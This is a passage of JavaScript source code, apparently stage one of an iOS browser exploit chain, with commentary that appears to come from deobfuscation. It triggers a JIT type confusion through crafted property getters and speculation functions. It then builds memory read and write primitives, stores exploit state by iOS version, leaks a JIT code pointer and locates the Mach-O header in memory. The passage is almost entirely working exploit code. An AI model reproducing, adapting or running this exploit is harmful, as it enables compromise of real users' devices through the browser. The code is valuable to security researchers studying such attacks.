        t.Cs.$s = c;
        t.Cs.Os = w;
        t.Cs.vs = b;
        t.Cs.Ds = d;
        t.Cs.Vs = h;
      };

      /**
       * JIT speculation function — builds arrays while exploiting
       * speculative type assumptions. The JIT assumes all array elements
       * are doubles, but the type confusion makes some be object pointers.
       */
      i.Es = new Function("t", "n", "o", "c",
      "if(false) {return " + Math.random() + " + " + Math.random() +
      "} {const s=t.t;const e=t.o;const r=t.l;const f=t.i;" +
      "const l=new Array(o);for(let a=0;a<o;a++){" +
      "const o=a%2===0?r:f;" +
      "const i=[s,e,o,-2.5301706769843864e-98,2];let u=i;" +
      "if(c===false)u=n;l[a]=i;" +
      "if(u===n){const o=n[0];const s=n[1];const e=n[3];" +
      "if(!c||e===-2.7130486595895504e-98){" +
      "const c=o/5e-324;const e=s/5e-324;const r=e+20;" +
      "n[2]=r*5e-324;t.u(t.h,t,r);" +
      "t.u(t.k,t,l[a][2],r,c);l[a][2]=null;t.A=true;break" +
      "}}}t.M[0]=Math.min(t.j.g,t.j.g);return l}");

      const t = new Array(5000);
      for (let e = 0; e < t.length; e++) t[e] = [e, 1.1, 2.2, 3.3, 4.4, 5.5];

      const e = new Array(t.length);
      for (let r = 0; r < t.length; r++)
      r % 4 == 0 && 3001 !== r && (e[r] = t[r]);

      const n = {
          zs: () => t[3001], // Getter: returns a specific array element
          qs() {// Getter: truncates array + triggers JIT
            t.length = 0;
            i.u(H);i.u(H);i.u(H);
          }
        },
        s = { length: 1, 0: 12 };

      function a() {
        arguments.length > 2 &&
        i.u(i.Es, i, arguments[3], arguments[4], arguments[5]);
      }

      // Configure the trigger object with property getters that
      // fire during array construction — this is how the type confusion
      // is triggered at exactly the right moment.
      Object.defineProperty(s, "3", { get: n.zs });
      Object.defineProperty(s, "4", { value: 10000 });
      Object.defineProperty(s, "5", { value: !0 });
      Object.defineProperty(s, "8", { get: n.qs });

      globalThis.inlinedFunction = a;
      i.m = a;

      // ── Primitive compilation: pointer setup ──────────────────────
      // This function manipulates the Float64/Uint32 views to construct
      // double values that encode specific pointer offsets.
      const l = (t, e) => {
        const r = (e, r) => (t.Ls[0] = e, t.Ls[1] = r, t.Rs[0]);
        h.a = r(0, t.Ks - 131072 /* 0x20000 */);
        h.b = r(7, (e >>> 0) - 131072);
        h.c = r(e / 4294967296 >>> 0, 1048575 /* 0xFFFFF */);
        t.M[0] = Math.min(t.j.g, t.j.g);
      };
      i.h = l;

      // JIT warmup: 100K iterations each to trigger compilation
      window.log(`[STAGE1] JIT warmup: compiling pointer-setup primitive (100K iterations)...`);
      for (let t = 0; t < 100000 && (l(i, 1.1), !(i.xs[1] < 0)); t++);

      // ── Primitive: read as integer (via double division) ──────────
      const o = (t, e, r) => (
      l(t, r + 8),
      t.M[0] = Math.min(t.j.g, t.j.g),
      0 | e.length);

      i.mi = o;
      for (let t = 0; t < 100000 && (i.u(o, i, i.i, 1.1), !(i.xs[1] < 0)); t++);

      // ── Primitive: write double to array ─────────────────────────
      const f = (t, e, r, n) => {
        t.u(l, t, r);
        e[0] = n;
        t.M[0] = Math.min(t.j.g, t.j.g);
      };
      i.Gs = f;
      for (let t = 0; t < 100000 && (i.u(f, i, i.i, 1.1, 1.1), !(i.xs[1] < 0)); t++);

      // ── Primitive: read double from array ────────────────────────
      const c = (t, e, r) => {
        t.u(l, t, r);
        const n = e[0];
        return t.M[0] = Math.min(t.j.g, t.j.g), n / 5e-324;
      };
      i.nr = c;
      for (let t = 0; t < 100000 && (i.u(c, i, i.i, 1.1), !(i.xs[1] < 0)); t++);

      // ── Trigger function wrapper ─────────────────────────────────
      const b = new Function("n", "l",
      "if(false) {return " + Math.random() + " + " + Math.random() +
      "} {n.m.apply(null,l);n.M[0]=Math.min(n.j.g,n.j.g)}");

      const g = [],
        w = [.1, .1, .1, -2.7130486595895504e-98, -2.7130486595895504e-98],
        d = [1.1, 2.2, 3.3, -2.7130486595895504e-98, -2.7130486595895504e-98],
        y = [1.1, 1.1, 1.1, -2.7130486595895504e-98, -2.7130486595895504e-98];

      // Warmup the speculation function: 100K iterations with alternating data
      window.log(`[STAGE1] JIT warmup: speculation function (100K iterations)...`);
      for (let t = 0; t < 100000 && (
      g.push(i.u(i.Es, i, w, 4, t % 2 != 0)),
      !(r[1] < 0));
      t++) {
        const e = t % 2 == 0 ? y : d;
        for (let t = 0; t < e.length; t++) w[t] = e[t];
      }

      // Warmup the trigger wrapper: 1M iterations
      window.log(`[STAGE1] JIT warmup: trigger wrapper (1M iterations)...`);
      for (let t = 0; t < 1000000 && (i.u(b, i, s, 4), !(i.xs[1] < 0)); t++);

      // ── THE TYPE CONFUSION TRIGGER ────────────────────────────────
      // Resize the trigger object and fire b(i, s) — the property getters
      // on `s` execute during Array.from/spread, causing the JIT to
      // confuse a double array with an object array.
      window.log(`[STAGE1] >>> TRIGGERING TYPE CONFUSION <<<`);
      s.length = 9;
      i.A = !1;
      i.u(b, i, s);
      if (!i.A) {throw new Error("!i.A: Type confusion did not trigger");}
      window.log(`[STAGE1] Type confusion SUCCESS — addrof/fakeobj primitives active`);

      // ── Post-exploitation setup ──────────────────────────────────
      window.log(`[STAGE1] Storing exploit state addresses...`);
      let A = null;
      platformModule.platformState.iOSVersion >= 160400 ? (
      i.Fs.storeExploitState(i.Cs.vs, i.Cs.Ns, i.Cs.$s, i.Cs.Js, i.Cs.Vs), A = i.Fs) : (
      i.Fs.storeExploitState(i.Cs.vs, i.Cs.Ds, i.Cs.$s, i.Cs.Os, i.Cs.Vs), A = i.Fs);

      // Walk backwards from the WebAssembly.Table JIT code pointer
      // to find the Mach-O header (magic: 0xFEEDFACF = 4277009103)
      let U = A.getJITCodePointer(WebAssembly.Table);
      window.log(`[STAGE1] JIT code pointer: 0x${U.toString(16)}`);
      U &= u; // Strip pointer tag
      let _ = U - U % 0x1000n; // Page-align
      if (0n === _) throw new Error("0n === _");
      window.log(`[STAGE1] Scanning for Mach-O header (0xFEEDFACF) from 0x${_.toString(16)}...`);
      for (;;) {
        if (0xFEEDFACF /* 0xFEEDFACF — MH_MAGIC_64 */ === A.read32(_)) break;
        _ -= BigInt(4096); // Walk back one page
      }
      window.log(`[STAGE1] Found Mach-O header at 0x${_.toString(16)}`);
      window.log(`[STAGE1] === Stage 1 complete ===`);
      return A;
    })();
  } catch (t) {
    throw platformModule.platformState.exploitPrimitive = void 0, t;
  }
}

// ════════════════════════════════════════════════════════════════════════════
// Module export
// ════════════════════════════════════════════════════════════════════════════

/** Export: r.si = exploitMain (async entry point for Stage 1) */
return r.si = L, r;